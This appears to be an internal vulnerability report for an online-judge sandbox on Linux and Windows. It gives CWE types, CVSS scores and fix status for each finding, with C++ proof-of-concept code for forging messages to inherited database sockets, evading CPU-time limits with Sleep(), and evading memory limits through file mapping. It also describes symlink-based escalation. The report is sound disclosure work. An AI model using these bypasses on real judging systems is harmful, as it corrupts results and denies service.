## Symbol convention

PLV：Process Limitation Violation  
PAV：Process Access Violation  
DoS：Denial of service

Specific types were marked with CWE.

CVSS scores are based on CVSS v4.0 Base Metrics (with optional Threat Metrics considered for range).

## Found vulnerability

### PAV1/DoS1  

**Type**:  
CWE-250 (Execution with Unnecessary Privileges)  
CWE-403 (Exposure of File Descriptor to Unintended Control Sphere)  
```json
{
	"base_score": 8.8,
	"score_range": "8.6-9.3",
	"vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:L/SI:H/SA:H",
	"metrics": {
		"Attack Vector": "Local",
		"Attack Complexity": "Low",
		"Attack Requirements": "None",
		"Privileges Required": "Low",
		"User Interaction": "None",
		"Vulnerable System Confidentiality": "Low",
		"Vulnerable System Integrity": "High",
		"Vulnerable System Availability": "High",
		"Subsequent System Confidentiality": "Low",
		"Subsequent System Integrity": "High",
		"Subsequent System Availability": "High"
	}
}
```

**Affected**:  
Linux judger  
during 1.0.0.0 internal check

**Description**:  
Child process contacts directly with database service through TCP socket fd inherited from parent, causing fake results in database, interrupted network protocol, and leads to a SIGSEGV exit of judger.

**Reason**:  
1. fork() and execl() inherits fd of father process, including socket fd used to contact with database
2. Reasons realted to communication protocol ommited, which can cause the whole judger exit abnormally  

**PoC**:  
```cpp
#include <unistd.h>
#include <string>
std::string build_forged_message();
int main() {
	std::string msg = build_forged_message();
	for (int fd = 3; fd < 256; ++fd)
		write(fd, msg.data(), msg.size());
	return 0;
}
```

**Status**:  
Open

### PLV1

**Type**:  
CWE-770 (Allocation of Resources Without Limits or Throttling)  
```json
{
	"base_score": 3.5,
	"score_range": "2.5-4.5",
	"vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
	"metrics": {
		"Attack Vector": "Local",
		"Attack Complexity": "Low",
		"Attack Requirements": "None",
		"Privileges Required": "Low",
		"User Interaction": "None",
		"Vulnerable System Confidentiality": "None",
		"Vulnerable System Integrity": "None",
		"Vulnerable System Availability": "Low",
		"Subsequent System Confidentiality": "None",
		"Subsequent System Integrity": "None",
		"Subsequent System Availability": "None"
	}
}
```

**Affected**:  
Windows judger  
during 1.0.0.0 internal check

**Description**:  
Process can exceed the maximum CPU time limit by using `Sleep()`, which consumes negligible CPU time and bypasses the CPU‑time‑based limit.

**Reason**:  
1. The judger monitors CPU time (kernel+user) via `GetProcessTimes`, but `Sleep()` does not consume CPU time, allowing the process to stay alive longer without hitting the limit.

**PoC**:  
```cpp
#include <Windows.h>
int main() { Sleep(100000); return 0; }
```

**Status**:  
Fixed

### PLV2

**Type**:  
CWE-755 (Improper Handling of Exceptional Conditions)  
```json
{
	"base_score": 3.5,
	"score_range": "2.5-4.5",
	"vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
	"metrics": {
		"Attack Vector": "Local",
		"Attack Complexity": "Low",
		"Attack Requirements": "None",
		"Privileges Required": "Low",
		"User Interaction": "None",
		"Vulnerable System Confidentiality": "None",
		"Vulnerable System Integrity": "None",
		"Vulnerable System Availability": "Low",
		"Subsequent System Confidentiality": "None",
		"Subsequent System Integrity": "None",
		"Subsequent System Availability": "None"
	}
}
```

**Affected**:  
Windows judger  
during 1.0.0.0 internal check

**Description**:  
Processes exceeding CPU time or memory limits cannot be properly terminated due to abnormal behavior of Job Object, leaving the process running indefinitely.

**Reason**:  
1. Job Object limit enforcement occasionally fails, resulting in the process not being killed when limits are exceeded.

**Status**:  
Fixed

### PLV3/PAV2/DoS2

**Type**:  
CWE-276 (Incorrect Default Permissions)  
CWE-400 (Uncontrolled Resource Consumption)  
CWE-61 (Symlink Following)  
```json
{
	"base_score": 9.3,
	"score_range": "8.3-9.8",
	"vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
	"metrics": {
		"Attack Vector": "Local",
		"Attack Complexity": "Low",
		"Attack Requirements": "None",
		"Privileges Required": "Low",
		"User Interaction": "None",
		"Vulnerable System Confidentiality": "High",
		"Vulnerable System Integrity": "High",
		"Vulnerable System Availability": "High",
		"Subsequent System Confidentiality": "High",
		"Subsequent System Integrity": "High",
		"Subsequent System Availability": "High"
	}
}
```

**Affected**:  
Windows judger  
during 1.0.0.0 internal check

**Description**:  
AppContainer sandbox grants Read/Write/Execute (RWE) access to `%TEMP%` and `C:\Users\<User>\AppData\Local\Packages\<SID>\`. This allows a sandboxed process to:
- Write arbitrary files, potentially filling the disk (DoS).
- Create symbolic links (or hard links) pointing to sensitive system files, enabling unauthorized access or privilege escalation if the judger later operates on those links.

**Reason**:  
1. AppContainer default permissions on these directories are overly permissive, violating least‑privilege.  
2. No restrictions on file types or link creation, allowing both resource exhaustion and link‑based attacks.

**Status**:  
Implemented, pending test

### PLV4/PAV3

**Type**:  
CWE-770 (Allocation of Resources Without Limits or Throttling)  
CWE-400 (Uncontrolled Resource Consumption)  
```json
{
	"base_score": 7.5,
	"score_range": "6.5-8.5",
	"vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
	"metrics": {
		"Attack Vector": "Local",
		"Attack Complexity": "Low",
		"Attack Requirements": "None",
		"Privileges Required": "Low",
		"User Interaction": "None",
		"Vulnerable System Confidentiality": "None",
		"Vulnerable System Integrity": "None",
		"Vulnerable System Availability": "High",
		"Subsequent System Confidentiality": "None",
		"Subsequent System Integrity": "None",
		"Subsequent System Availability": "None"
	}
}
```

**Affected**:  
Windows judger  
during 1.0.0.0 internal check

**Description**:  
A process can bypass memory limitations by creating a file in `%TEMP%` and mapping it into working pages using `CreateFileMappingA`/`MapViewOfFile`. The mapped memory is not fully accounted in `PeakPageFileUsage` reported by `GetProcessMemoryInfo`, so it evades the memory limit check.

**Reason**:  
1. AppContainer allows RWE access to `%TEMP%`, enabling file creation and mapping.  
2. `PeakPageFileUsage` does not include the working set size of memory‑mapped files, so the memory consumption is not charged against the limit.

**PoC**:  
```cpp
#include <windows.h>
#include <iostream>
#include <chrono>
#include <thread>
int main() {
	const size_t SIZE = 4ULL * 1024 * 1024 * 1024;
	char tempPath[MAX_PATH];
	if (!GetTempPathA(MAX_PATH, tempPath)) return 1;
	std::string filePath = std::string(tempPath) + "poc_mmap.bin";
	HANDLE hFile = CreateFileA(filePath.c_str(),
							   GENERIC_READ | GENERIC_WRITE,
							   FILE_SHARE_READ | FILE_SHARE_WRITE,
							   NULL, CREATE_ALWAYS,
							   FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return 1;
	LARGE_INTEGER li; li.QuadPart = SIZE;
	if (!SetFilePointerEx(hFile, li, NULL, FILE_BEGIN) || !SetEndOfFile(hFile)) {
		CloseHandle(hFile); return 1;
	}
	HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READWRITE,
										 li.HighPart, li.LowPart, NULL);
	if (!hMapping) { CloseHandle(hFile); return 1; }
	void* view = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, SIZE);
	if (!view) {
		CloseHandle(hMapping); CloseHandle(hFile); return 1;
	}
	char* p = static_cast<char*>(view);
	for (size_t i = 0; i < SIZE; i += 4096) p[i] = 0xAA;
	std::this_thread::sleep_for(std::chrono::seconds(4));
	UnmapViewOfFile(view);
	CloseHandle(hMapping);
	CloseHandle(hFile);
	DeleteFileA(filePath.c_str());
	return 0;
}
```

**Status**:  
Alleviated, but not fully resolved